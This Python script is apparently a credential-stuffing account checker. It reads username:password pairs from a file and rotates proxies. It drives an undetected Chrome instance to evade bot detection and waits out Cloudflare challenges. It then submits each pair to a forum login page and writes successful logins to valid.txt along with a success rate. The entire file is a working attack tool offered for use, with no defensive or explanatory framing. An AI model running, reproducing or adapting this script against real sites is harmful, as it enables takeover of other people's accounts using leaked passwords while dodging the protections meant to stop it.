from undetected_chromedriver import Chrome, ChromeOptions
import time
from colorama import Fore, Style

valid_accounts = []
credentials_file = 'creds.txt'
proxies_file = 'proxies.txt'
login_url = 'https://example.com/forum/login/login'
forum_url = 'https://example.com/forum/'


def is_cloudflare_uam(driver):
    return "Checking if the site connection is secure" in driver.page_source


def login_to_forum(username, password, proxy, valid_accounts):

    # chrome options ...
    options = ChromeOptions()
    options.add_argument('--proxy-server=%s' % proxy)
    driver = Chrome(options=options)

    # get the login page
    driver.get(login_url)
    # wait for page to load
    time.sleep(2)

    consecutive_uam_challenges = 0

    # check for Cloudflare UAM challenge
    while is_cloudflare_uam(driver):
        print("Cloudflare UAM challenge detected. Waiting for 4 seconds...")
        time.sleep(4)
        consecutive_uam_challenges += 1

        # if there are multiple consecutive UAM challenges, skip this login
        if consecutive_uam_challenges >= 6:
            consecutive_uam_challenges = 0
            print("Quitting the WebDriver...")
            driver.quit()
            return

        driver.refresh()
        time.sleep(1)

    # main login code
    username_field = driver.find_element("name", 'login')
    password_field = driver.find_element("name", 'password')
    username_field.send_keys(username)
    password_field.send_keys(password)
    password_field.submit()

    # check if the login was successful by checking if redirected or not (stays on the same page if failed)
    if driver.current_url == forum_url:
        print(Fore.GREEN +
              f'Login successful for {username}.' + Style.RESET_ALL)
        # append to valid accounts list
        valid_accounts.append((username, password))
        # save in file
        with open("valid.txt", "a") as file:
            file.write(f"{username}:{password}\n")
    else:
        print(Fore.RED + f'Login failed for {username}.' + Style.RESET_ALL)

    # kill webdriver
    driver.quit()


# read creds from file (username:password)
def read_credentials(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file:
            username, password = line.strip().split(':')
            credentials.append((username, password))
    return credentials

# read proxies from file (ip:port)
def read_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies


credentials = read_credentials(credentials_file)
proxies = read_proxies(proxies_file)

# Iterate over credentials and proxies
for i, (username, password) in enumerate(credentials):
    proxy = proxies[i % len(proxies)]  # get a proxy from the list
    print(f'Logging in with {username}:{password} using proxy {proxy}')
    login_to_forum(username, password, proxy, valid_accounts)


# calculate percentage and total
total_accounts = len(credentials)
valid_percentage = (len(valid_accounts) / total_accounts) * 100

# print the valid accounts and statistics
print("Valid Accounts:")
for username, password in valid_accounts:
    print(f"Username: {username}, Password: {password}")
print()
print(f"Total Accounts: {total_accounts}")
print(f"Valid Accounts: {len(valid_accounts)}")
print(f"Valid Percentage: {valid_percentage}%")
